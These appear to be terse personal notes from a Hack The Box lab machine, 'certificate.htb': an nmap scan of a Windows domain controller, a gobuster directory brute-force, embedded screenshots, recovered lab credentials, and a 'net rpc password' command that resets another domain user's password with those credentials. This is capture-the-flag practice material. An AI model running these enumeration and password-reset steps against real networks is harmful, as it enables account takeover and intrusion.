# Enumeration
## Nmap

ORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 08:20:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP 
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: 
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP 
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
49752/tcp open  msrpc         Microsoft Windows RPC

## website 

![[Pasted image 20250604022358.png]]


gobuster dir -u http://certificate.htb  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x .php


![[Pasted image 20250606232707.png]]


![[Pasted image 20250607000638.png]]




![[Pasted image 20250607000531.png]]

![[Pasted image 20250607003813.png]]
certificate_webapp_user:cert!f!c@teDBPWD

![[Pasted image 20250607004547.png]]
sara.b@certificate.htb:Blink182

net rpc password "lion.sk" "newP@ssword2022" -U "certificate.htb"/"Sara.B"%"Blink182" -S certificate.htb


![[Pasted image 20250607034618.png]]
